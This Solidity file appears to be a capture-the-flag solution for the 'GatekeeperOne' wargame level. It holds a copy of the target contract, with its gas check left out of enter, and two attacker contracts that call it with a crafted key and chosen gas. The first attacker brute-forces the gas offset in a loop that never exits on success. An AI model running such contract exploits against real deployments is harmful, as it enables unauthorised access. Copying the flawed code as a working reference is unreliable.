
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
    _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
    }

    function enter(bytes8 _gateKey) public gateOne() gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
    }
}

contract GatekeeperOneAttack_nope {
    GatekeeperOne constant contract_2_attack = GatekeeperOne(0xB823c515787922B2091B56D2a22e4960C34c93ae);
    event GasOffset(uint256 _value);

    constructor(bytes8 _gateKey) {
        enter(_gateKey);
    }

    function enter(bytes8 _gateKey) public {
        uint256 gasOffset = 0;
        
        while(true) {
            try contract_2_attack.enter{gas : 8191 * 10 + gasOffset}(_gateKey) {
                // If the require statement does not trigger an error,
                // the rest of the function's logic can continue here
            } catch (bytes memory) {
                // Error handling code goes here
                if (gasOffset < 1000) {
                    gasOffset = gasOffset + 1;
                    //emit GasOffset(gasOffset);
                } else {
                    revert();
                }
            }
        }
    }
}


contract GatekeeperOneAttack {
    
    function enter(address _gatekeeper, bytes8 _gateKey, uint32 _gas) public {
        GatekeeperOne contract_2_attack = GatekeeperOne(_gatekeeper);
        contract_2_attack.enter{gas: _gas}(_gateKey);
    }
}